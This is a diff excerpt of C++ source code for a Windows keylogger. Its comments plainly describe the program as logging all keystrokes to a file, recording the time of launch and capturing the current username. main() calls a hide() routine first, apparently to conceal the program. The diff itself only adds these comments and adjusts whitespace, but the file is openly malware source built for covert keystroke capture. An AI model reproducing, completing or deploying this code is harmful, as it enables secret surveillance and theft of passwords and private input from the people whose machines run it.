@@ -17,17 +17,15 @@ void username();
 int main()
 {
 
-
 hide();	
 time();
 username();
 write();
 	
-
 		return 0;
 }
 
-void write()
+void write()  		//Write On NotePad All the Key strokes
 {
 	char ch;
 	for(;;)
@@ -52,9 +50,8 @@ void write()
 					write.close();
 					break;
 				}
-				
-				
-				
+			
+							
 				switch (ch)
 				{
 					case 8:write<<" Backspace ";
@@ -172,7 +169,7 @@ void write()
 		
 }
 
-void time()
+void time()				// Time of Launch of KeyLogger
 {
 	
 	time_t rawtime;
@@ -192,7 +189,7 @@ void time()
 	
 }
 
-void username()
+void username()				// Current Username Information
 {
 TCHAR name [ UNLEN + 1 ];
   DWORD size = UNLEN + 1;
